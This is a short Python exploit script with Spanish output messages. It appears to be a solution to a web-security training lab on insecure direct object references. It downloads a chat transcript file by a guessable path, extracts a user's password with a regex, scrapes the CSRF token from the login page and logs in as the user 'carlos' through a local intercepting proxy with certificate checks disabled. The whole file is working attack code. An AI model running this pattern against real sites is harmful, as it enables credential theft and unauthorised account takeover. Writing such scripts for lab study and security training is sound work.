import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1.8080', 'https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) !=2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    password = extract_password(session,base_url)
    if password:
        login_session_carlos(session,base_url,"carlos",password)
    
    
def extract_password(session,base_url):
    password_path = f"{base_url}/download-transcript/1.txt"
    response = session.get(password_path,verify=False,proxies=proxies_setting)
    if "my password is" in response.text:
        match_password = re.findall(r'my password is ([^.]+)',response.text)
        password = match_password[0]
        print(f"(+) Password encontrada: {password}")
        return password
        
    else:
        print("(-) No se encontrao la password")

def get_csrf_token(session,url_login,username):
    response = session.get(url_login,verify=False,proxies=proxies_setting)
    soup = BeautifulSoup(response.text,'html.parser')
    csrf = soup.find('input',{'name': 'csrf'})['value']
    print(f"(+) El token para el usuario {username} es: {csrf}")
    return csrf
    
def login_session_carlos(session,base_url,username,password):
    print("(+) Intentando iniciar sessión con la password encontrada...")
    url_login = f"{base_url}/login"
    csrf_token = get_csrf_token(session,url_login,username)
    credential = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    response = session.post(url_login,data=credential,verify=False,proxies=proxies_setting)
    if "carlos" in response.text:
        print(f"(+) Login exitoso con user {username}")
    else:
        print(f"(-) Login fallido con user {username}")

if __name__== "__main__":
    main()